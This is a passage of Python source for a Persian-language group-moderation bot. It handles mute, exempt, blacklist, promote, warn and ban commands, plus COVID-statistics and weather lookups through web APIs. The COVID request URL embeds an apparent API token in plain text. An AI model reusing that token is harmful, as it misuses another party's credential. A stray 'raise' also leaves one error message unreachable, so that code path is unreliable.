                                        if reply_message_guid in INFOS[object_guid]['exempt_list']:
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست معاف بود. ' + ST['ok'], 2)
                                        else:
                                            INFOS[object_guid]['exempt_list'][reply_message_guid] = first_name
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') به لیست معاف اضافه شد. ' + ST['ok'], 2)
                            elif command.startswith('سکوت u0'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('سکوت', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    elif reply_message_guid in ADMINS:
                                        mess = MPro('ایشون ادمین است.' + ST['ok'])
                                    else:
                                        first_name = check_name(object_guid, reply_message_guid)
                                        if reply_message_guid in INFOS[object_guid]['silent_list']:
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست سکوت بود. ' + ST['ok'], 2)
                                        else:
                                            INFOS[object_guid]['silent_list'][reply_message_guid] = first_name
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') به لیست سکوت اضافه شد. ' + ST['ok'], 2)
                            elif command.startswith('معاف u0'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('معاف', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    elif reply_message_guid in ADMINS:
                                        mess = MPro('ایشون ادمین است.' + ST['ok'])
                                    else:
                                        first_name = check_name(object_guid, reply_message_guid)
                                        if reply_message_guid in INFOS[object_guid]['exempt_list']:
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست معاف بود. ' + ST['ok'], 2)
                                        else:
                                            INFOS[object_guid]['exempt_list'][reply_message_guid] = first_name
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') به لیست معاف اضافه شد. ' + ST['ok'], 2)
                            elif command.startswith('حذف سکوت @'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('حذف سکوت', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    if reply_message_guid in INFOS[object_guid]['silent_list']:
                                        del INFOS[object_guid]['silent_list'][reply_message_guid]
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') از لیست سکوت حذف شد. ' + ST['ok'], 2)
                                    else:
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست سکوت یافت نشد. ' + ST['ok'], 2)
                            elif command.startswith('حذف معاف @'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('حذف معاف', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    if reply_message_guid in INFOS[object_guid]['exempt_list']:
                                        del INFOS[object_guid]['exempt_list'][reply_message_guid]
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') از لیست معاف حذف شد. ' + ST['ok'], 2)
                                    else:
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست معاف یافت نشد. ' + ST['ok'], 2)
                            elif command.startswith('حذف سکوت u0'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('حذف سکوت', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    if reply_message_guid in INFOS[object_guid]['silent_list']:
                                        del INFOS[object_guid]['silent_list'][reply_message_guid]
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') از لیست سکوت حذف شد. ' + ST['ok'], 2)
                                    else:
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست سکوت یافت نشد. ' + ST['ok'], 2)
                            elif command.startswith('حذف معاف u0'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('حذف معاف', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    if reply_message_guid in INFOS[object_guid]['exempt_list']:
                                        del INFOS[object_guid]['exempt_list'][reply_message_guid]
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') از لیست معاف حذف شد. ' + ST['ok'], 2)
                                    else:
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست معاف یافت نشد. ' + ST['ok'], 2)
                            elif command.startswith('کیل @'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('کیل', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    elif reply_message_guid in ADMINS:
                                        mess = MPro('ایشون ادمین است.' + ST['ok'])
                                    else:
                                        first_name = check_name(object_guid, reply_message_guid)
                                        if reply_message_guid in INFOS[object_guid]['black_list']:
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست کیل بود. ' + ST['ok'], 2)
                                        else:
                                            INFOS[object_guid]['black_list'][reply_message_guid] = [first_name, 1]
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') به لیست کیل اضافه شد. ' + ST['ok'], 2)
                            elif command.startswith('کیل u0'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('کیل', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    elif reply_message_guid in ADMINS:
                                        mess = MPro('ایشون ادمین است.' + ST['ok'])
                                    else:
                                        first_name = check_name(object_guid, reply_message_guid)
                                        if reply_message_guid in INFOS[object_guid]['black_list']:
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست کیل بود. ' + ST['ok'], 2)
                                        else:
                                            INFOS[object_guid]['black_list'][reply_message_guid] = [first_name, 1]
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') به لیست کیل اضافه شد. ' + ST['ok'], 2)
                            elif command.startswith('حذف کیل @'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('حذف کیل', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    if reply_message_guid in INFOS[object_guid]['black_list']:
                                        INFOS[object_guid]['black_list'].pop(reply_message_guid)
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') از لیست کیل حذف شد. ' + ST['ok'], 2)
                                    else:
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست کیل یافت نشد. ' + ST['ok'], 2)
                            elif command.startswith('حذف کیل u0'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('حذف کیل', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    if reply_message_guid in INFOS[object_guid]['black_list']:
                                        INFOS[object_guid]['black_list'].pop(reply_message_guid)
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') از لیست کیل حذف شد. ' + ST['ok'], 2)
                                    else:
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست کیل یافت نشد. ' + ST['ok'], 2)
                            elif command.startswith('برکناری @'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('برکناری', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    elif reply_message_guid not in ADMINS:
                                        mess = MPro('ایشون ادمین نیست.' + ST['ok'])
                                    else:
                                        first_name = check_name(object_guid, reply_message_guid)
                                        del INFOS[object_guid]['admins'][reply_message_guid]
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') برکنار شد. ' + ST['ok'], 2)
                                        try:
                                            client.unset_admin(object_guid, reply_message_guid)
                                        except:
                                            pass
                            elif command.startswith('برکناری u0'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('برکناری', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    elif reply_message_guid not in ADMINS:
                                        mess = MPro('ایشون ادمین نیست.' + ST['ok'])
                                    else:
                                        first_name = check_name(object_guid, reply_message_guid)
                                        del INFOS[object_guid]['admins'][reply_message_guid]
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') برکنار شد. ' + ST['ok'], 2)
                                        try:
                                            client.unset_admin(object_guid, reply_message_guid)
                                        except:
                                            pass
                            elif command.startswith('ارتقا @'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('ارتقا', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    else:
                                        first_name = check_name(object_guid, reply_message_guid)
                                        INFOS[object_guid]['admins'][reply_message_guid] = first_name
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') ادمین شد. ' + ST['ok'], 2)
                                        try:
                                            client.set_admin(object_guid, reply_message_guid, random.choice(BoxEmoji))
                                        except:
                                            pass
                            elif command.startswith('ارتقا u0'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('ارتقا', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    else:
                                        first_name = check_name(object_guid, reply_message_guid)
                                        INFOS[object_guid]['admins'][reply_message_guid] = first_name
                                        mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') ادمین شد. ' + ST['ok'], 2)
                                        try:
                                            client.set_admin(object_guid, reply_message_guid, random.choice(BoxEmoji))
                                        except:
                                            pass
                            elif command.startswith('رفع محدودیت @'):
                                mess = MPro('کاربر یافت نشد.' + ST['ok'], 2)
                                command = command.replace('رفع محدودیت', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') رفع محدودیت شد. ' + ST['ok'], 2)
                                    resetUser(reply_message_guid, object_guid)
                                    try:
                                        client.unban_member(object_guid, reply_message_guid)
                                    except:
                                        pass
                            elif command.startswith('رفع محدودیت u0'):
                                mess = MPro('کاربر یافت نشد.' + ST['ok'], 2)
                                command = command.replace('رفع محدودیت', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') رفع محدودیت شد. ' + ST['ok'], 2)
                                    resetUser(reply_message_guid, object_guid)
                                    try:
                                        client.unban_member(object_guid, reply_message_guid)
                                    except:
                                        pass
                            elif command.startswith('اخطار @'):
                                mess = MPro('کاربر یافت نشد.' + ST['ok'], 2)
                                command = command.replace('اخطار', '')
                                reply_message_guid = getinfos(command)

                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'], 2)
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'], 2)
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'], 2)
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'], 2)
                                    else:
                                        count = INFOS[object_guid]['warnning']
                                        first_name = check_name(object_guid, reply_message_guid)
                                        pscount = USERS[object_guid][reply_message_guid][1]
                                        isadmin = False
                                        if reply_message_guid in ADMINS:
                                            isadmin = True
                                        pscount += 1
                                        if pscount >= count:
                                            if isadmin:
                                                del INFOS[object_guid]['admins'][reply_message_guid]
                                                try:
                                                    client.unset_admin(object_guid, reply_message_guid)
                                                except:
                                                    pass
                                            else:
                                                USERS[object_guid][reply_message_guid][1] = 1
                                                INFOS[object_guid]['ban'] += 1
                                                try:
                                                    reply_message_banded_id = client.ban_member(object_guid, reply_message_guid)['chat_update']['chat']['last_message']['message_id']
                                                except:
                                                    pass
                                                resetUser(reply_message_guid, object_guid)
                                                if int(SETTING_KEYS[8]):
                                                    mess = INFOS[object_guid]['bye']
                                            if pscount == count:
                                                if int(SETTING_KEYS[6]):
                                                    if isadmin:
                                                        mess = MPro(f'کاربر @@ {first_name} @@({reply_message_guid})〔{str(pscount)}/{str(count)}〕⚠️', 2)
                                                    else:
                                                        mess = MPro(f'کاربر @@ {first_name} @@({reply_message_guid})〔{str(pscount)}/{str(count)}〕🚫', 2)
                                        else:
                                            USERS[object_guid][reply_message_guid][1] = pscount
                                            if int(SETTING_KEYS[6]):
                                                mess = MPro(f'کاربر @@ {first_name} @@({reply_message_guid})〔{str(pscount)}/{str(count)}〕⚠️', 2)
                            elif command.startswith('اخطار u0'):
                                mess = MPro('کاربر یافت نشد.' + ST['ok'], 2)
                                command = command.replace('اخطار', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    else:
                                        first_name = check_name(object_guid, reply_message_guid)
                                        count = INFOS[object_guid]['warnning']
                                        pscount = USERS[object_guid][reply_message_guid][1]
                                        isadmin = False
                                        if reply_message_guid in ADMINS:
                                            isadmin = True
                                        else:
                                            pscount += 1
                                        if pscount >= count:
                                            if isadmin:
                                                del INFOS[object_guid]['admins'][reply_message_guid]
                                                try:
                                                    client.unset_admin(object_guid, reply_message_guid)
                                                except:
                                                    pass
                                            else:
                                                try:
                                                    USERS[object_guid][reply_message_guid][1] = pscount
                                                    INFOS[object_guid]['ban'] += 1
                                                    reply_message_banded_id = client.ban_member(object_guid, reply_message_guid)['chat_update']['chat']['last_message']['message_id']
                                                    resetUser(reply_message_guid, object_guid)
                                                    if int(SETTING_KEYS[8]):
                                                        mess = INFOS[object_guid]['bye']
                                                except:
                                                    pass
                                                if pscount == count:
                                                    if int(SETTING_KEYS[6]):
                                                        if isadmin:
                                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ')〔' + str(pscount) + '/' + str(count) + '〕⚠️', 2)
                                                        else:
                                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ')〔' + str(pscount) + '/' + str(count) + '〕🚫', 2)
                                        else:
                                            USERS[object_guid][reply_message_guid][1] = pscount
                                            if int(SETTING_KEYS[6]):
                                                mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ')〔' + str(pscount) + '/' + str(count) + '〕⚠️', 2)
                            elif command.startswith('حذف اخطار @'):
                                mess = MPro('کاربر یافت نشد.' + ST['ok'], 2)
                                command = command.replace('حذف اخطار', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    resetUser(reply_message_guid, object_guid)
                                    mess = MPro('اخطار @@ ' + first_name + ' @@(' + reply_message_guid + ') حدف شد. ' + ST['ok'], 2)
                            elif command.startswith('حذف اخطار u0'):
                                mess = MPro('کاربر یافت نشد.' + ST['ok'], 2)
                                command = command.replace('حذف اخطار', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    resetUser(reply_message_guid, object_guid)
                                    mess = MPro('اخطار @@ ' + first_name + ' @@(' + reply_message_guid + ') حدف شد. ' + ST['ok'], 2)
                            elif command.startswith('امار @'):
                                mess = MPro('کاربر یافت نشد.' + ST['ok'], 2)
                                command = command.replace('امار', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    rank = formrank(Coder, ADMINS, FULL_ADMINS, HOWNER, OWNER, reply_message_guid)
                                    mess = MPro('مقام 〔 ' + rank + ' 〕', 4)
                                    user = client.get_chat_info(reply_message_guid)['user']
                                    mess += manage_info(user)
                                    if reply_message_guid not in USERS[object_guid]:
                                        getInfoUser(object_guid, reply_message_guid)
                                    else:
                                        mess += formInfo(USERS[object_guid][reply_message_guid], OBJM, reply_message_guid)
                                        mess += '\n'
                                        mess += MPro(reply_message_guid)
                                        mess += '\n─┅━━━━━━━┅─'
                                        if 'bio' in user:
                                            bio = user['bio']
                                            mess += '\n\n' + bio
                            elif command.startswith('امار u0'):
                                mess = MPro('کاربر یافت نشد.' + ST['ok'], 2)
                                command = command.replace('امار', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    rank = formrank(Coder, ADMINS, FULL_ADMINS, HOWNER, OWNER, reply_message_guid)
                                    mess = MPro('مقام 〔 ' + rank + ' 〕', 4)
                                    user = client.get_chat_info(reply_message_guid)['user']
                                    mess += manage_info(user)
                                    if reply_message_guid not in USERS[object_guid]:
                                        getInfoUser(object_guid, reply_message_guid)
                                    else:
                                        mess += formInfo(USERS[object_guid][reply_message_guid], OBJM, reply_message_guid)
                                        mess += '\n'
                                        mess += MPro(reply_message_guid)
                                        mess += '\n─┅━━━━━━━┅─'
                                        if 'bio' in user:
                                            bio = user['bio']
                                            mess += '\n\n' + bio
                            elif command.startswith('کرونا '):
                                try:
                                    locat = command.replace('کرونا ', '').strip()
                                    response = requests.get('https://one-api.ir/corona/?token=833942:64919956105c3', timeout=30)
                                    result = response.json()
                                    if result['status'] == 200:
                                        entries = result['result']['entries']
                                        isok = False
                                        for mins in Countris:
                                            for min in mins:
                                                if locat == min:
                                                    isok = True
                                                    break
                                            if isok:
                                                break
                                        if isok:
                                            pname = mins[0]
                                            ename = mins[1]
                                            for num in entries:
                                                if 'country' in num:
                                                    name = num['country']
                                                    if name == pname:
                                                        country = num
                                                        break
                                            Name_continent = country['continent']
                                            Name_country = country['country']
                                            cases = country['cases']
                                            deaths = country['deaths']
                                            recovered = country['recovered']
                                            Name_continentF = ''
                                            if Name_continent == 'Asia':
                                                Name_continentF = 'اسیا'
                                            elif Name_continent == 'Africa':
                                                Name_continentF = 'افریقا'
                                            elif Name_continent == 'Europe':
                                                Name_continentF = 'اروپا'
                                            elif Name_continent == 'North America':
                                                Name_continentF = 'امریکای شمالی'
                                            elif Name_continent == 'South America':
                                                Name_continentF = 'امریکای جنوبی'
                                            elif Name_continent == 'Australia':
                                                Name_continentF = 'استرالیا'
                                            elif Name_continent == 'Antarctica':
                                                Name_continentF = 'جنوبگان'
                                            elif Name_continent == 'Oceania':
                                                Name_continentF = 'اقیانوسیه'
                                            mess = '⌯ #ᑕOᖇOᑎᗩ\n\n'
                                            mess += '𝗖𝗼𝗻𝘁𝗶𝗻𝗲𝗻𝘁 » ' + Name_continent + ' ⌯ ' + Name_continentF + '\n'
                                            mess += '𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » ' + Name_country + ' ⌯ ' + ename + '\n\n'
                                            mess += '𝗖𝗮𝘀𝗲𝘀 » ' + str(cases) + ' مورد\n'
                                            mess += '𝗗𝗲𝗮𝘁𝗵𝘀 » ' + str(deaths) + ' فوت شده\n'
                                            mess += '𝗥𝗲𝗰𝗼𝘃𝗲𝗿𝗱 » ' + str(recovered) + ' بهبود یافته\n'
                                except Exception as e:

                                    mess = 'خطایی رخ داد' + ST['ok']
                            elif command.startswith('وضعیت '):
                                locat = command.replace('وضعیت', '').strip()
                                cities = [['Tehran', 'تهران'], ['Tabriz', 'تبریز', 'اذربایجان شرقی', 'اذربایجان شرقی'], ['Urmia', 'ارومیه', 'اذربایجان غربی', 'اذربایجان غربی'], ['Ardabil', 'اردبیل'], ['Isfahan', 'اصفهان'], ['Karaj', 'کرج', 'البرز'], ['Ilam', 'ایلام'], ['Bushehr', 'بوشهر'], ['Shahre-Kord', 'شهرکرد', 'چهارمحال و بختیاری', 'چهارمحال'], ['Birjand', 'بیرجند', 'خراسان جنوبی'], ['Mashhad', 'مشهد', 'خراسان رضوی'], ['Bojnord', 'بجنورد', 'خراسان شمالی'], ['Ahvaz', 'اهواز', 'خوزستان'], ['Zanjan', 'زنجان'], ['Semnan', 'سمنان'], ['Zahedan', 'زاهدان', 'سیستان و بلوچستان', 'سیستان'], ['Shiraz', 'شیراز', 'فارس'], ['Qazvin', 'قزوین'], ['Qom', 'قم'], ['Sanandaj', 'کردستان', 'سنندج'], ['Kerman', 'کرمان'], ['Kermanshah', 'کرمانشاه'], ['Yasuj', 'یاسوج', 'کهگیلویه و بویراحمد', 'کهگیلویه'], ['Gorgan', 'گلستان', 'گرگان'], ['Rasht', 'گیلان', 'رشت'], ['Khorramabad', 'لرستان', 'خرم\u200cاباد', 'خرم\u200cاباد'], ['Sari', 'مازندران', 'ساری'], ['Arak', 'اراک', 'مرکزی'], ['Bandar-Abbas', 'هرمزگان', 'بندرعباس'], ['Hamadan', 'همدان'], ['Yazd', 'یزد']]
                                elocat = False
                                mess = False
                                mess = MPro('شهر مورد نظر یافت نشد.' + ST['ok'], 2)
                                for city in cities:
                                    for step in city:
                                        if step == locat:
                                            elocat = city[0]
                                            plocat = city[1]
                                            break
                                if not elocat:
                                    mess = MPro('شهر مورد نظر یافت نشد.' + ST['ok'], 2)
                                else:
                                    try:
                                        response = requests.get(f'http://dorweb.ir/api/weather/{elocat}', timeout=30)
                                        response = response.json()
                                        if not response['IsOK']:
                                            mess = MPro('خطایی رخ داد.' + ST['ok'], 2)
                                        else:
                                            result = response['Result']
                                            location = result['location']
                                            province = location['province']['caption']
                                            city = location['city']['caption']
                                            weather = result['weather']
                                            persian_dt = weather['persian_dt']
                                            descriptionF = weather['description']
                                            descriptionE = weather['description']
                                            main_weather = weather.get('main', {})
                                            if not main_weather:
                                                main_weather = {}
                                            temp_min = str(main_weather.get('temp_min', 0))
                                            temp_max = str(main_weather.get('temp_max', 0))
                                            humidity = str(main_weather.get('humidity', 0))
                                            windSpeed = str(weather.get('wind', {}).get('speed', 0))
                                            temp_max = temp_max + '°C'
                                            temp_min = temp_min + '°C'
                                            humidity = humidity + ' %'
                                            windSpeed = windSpeed + ' km/h'
                                            mess = '⌯ #ᗯᗴᗩTᕼᗴᖇ\n\n'
                                            mess += f'𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻 » {province} / {city}\n'
                                            mess += f'𝗗𝗮𝘁𝗲 » {persian_dt}\n\n'
                                            mess += f'{descriptionE} ⌯ {descriptionF}\n'
                                            mess += f'𝗧𝗲𝗺𝗽 » {temp_max} / {temp_min}\n'
                                            mess += f'𝗛𝘂𝗺𝗶𝗱𝗶𝘁𝘆 » {humidity}\n'
                                            mess += f'𝗪𝗶𝗻𝗱 𝗦𝗽𝗲𝗲𝗱 » {windSpeed}\n'
                                    except Exception as e:
                                        raise
                                        mess = MPro('خطایی رخ داد.' + ST['ok'], 2)

                        if not mess and wordCount <= 4:

                            cmd, cmdx, order = (None, None, None)
                            cmds_on = ('باز', 'روشن', 'ازاد', 'فعال', 'وصل')
                            cmds_off = ('بسته', 'خاموش', 'قفل', 'غیرفعال', 'قطع')
                            for cmd_on in cmds_on:
                                if cmd_on in command:
                                    command = command.replace(cmd_on, '')
                                    Vb = True
                                    cmdx = cmd_on
                                    cmd = command.replace(cmd_on, '', 1)
                            for cmd_off in cmds_off:
                                if cmd_off in command:
                                    command = command.replace(cmd_off, '')
                                    Vb = False
                                    cmdx = cmd_off
                                    cmd = command.replace(cmd_off, '', 1)
                            if cmd and cmd.startswith('دستور '):
                                cmd = cmd.replace('دستور', '')
                                order = True
                                cmd = cmd.strip()

                            if cmd:

                                cmd = cmd.strip()
                                if cmd in Listkeys and order:
                                    isok = True
                                    if TIP <= 3 and int(SETTING_KEYS[17]) == 0:
                                        isok = False
                                    if isok:
                                        key = int(Listkeys[cmd])
                                        ORDERS_KEYS[key] = str(int(Vb))
                                        INFOS[object_guid]['keys'] = ''.join(ORDERS_KEYS)

                                        mess = MPro(f"دستور {cmd} {cmdx} است. {ST['ok']}", 2)
                                elif not order:
                                    if cmd == 'کال' or cmd == 'ویسکال':
                                        if Vb:
                                            mess = MPro(f"ویسکال ایجاد شد. {ST['ok']}", 2)
                                            result = client.create_voice_chat(object_guid)
                                            if result['status'] == 'VoiceChatExist':
                                                countMember = result['exist_group_voice_chat']['participant_count']
                                                title = result['exist_group_voice_chat']['title']
                                                mess = MPro(f"ویسکال ایجاد شده است. {ST['ok']}", 4)
                                                mess += MPro(f"عنوان : {title}")
                                                mess += MPro(f"تعداد افراد : {str(countMember)}")
                                            else:
                                                INFOS[object_guid]['voice_call'] += 1
                                        else:
                                            mess = MPro(f"کال قطع شد. {ST['ok']}", 2)
                                            result = client.get_chat_info(object_guid)
                                            if 'group_voice_chat_id' in result['chat']:

                                                group_voice_chat_id = result['chat']['group_voice_chat_id']
                                                client.discard_voice_chat(object_guid, group_voice_chat_id)
                                    elif cmd == 'ضدفش' or cmd == 'ضد فش':
                                        if Vb:
                                            words = ['کص', 'کوبص', 'کوص', 'کون', 'کیر', 'ممه', 'لخت', 'برهنه', 'سکس', 'جنده', 'گایید', 'گاید', 'پورن', 'گوه', 'sex', 'xnxx', 'porn']
                                            for word in words:
                                                if word not in INFOS[object_guid]['filterlist']:
                                                    INFOS[object_guid]['filterlist'].append(word)
                                            keys = list(INFOS[object_guid]['locks'])
                                            key = int(15)
                                            keys[key] = '0'
                                            INFOS[object_guid]['locks'] = ''.join(keys)
                                        else:
                                            keys = list(INFOS[object_guid]['locks'])
                                            key = int(15)
                                            keys[key] = '1'
                                            INFOS[object_guid]['locks'] = ''.join(keys)
                                        mess = MPro(f"{cmd} {cmdx} است. {ST['ok']}", 2)
                                    elif cmd == 'سرگرمی':
                                        if TIP >= 4:
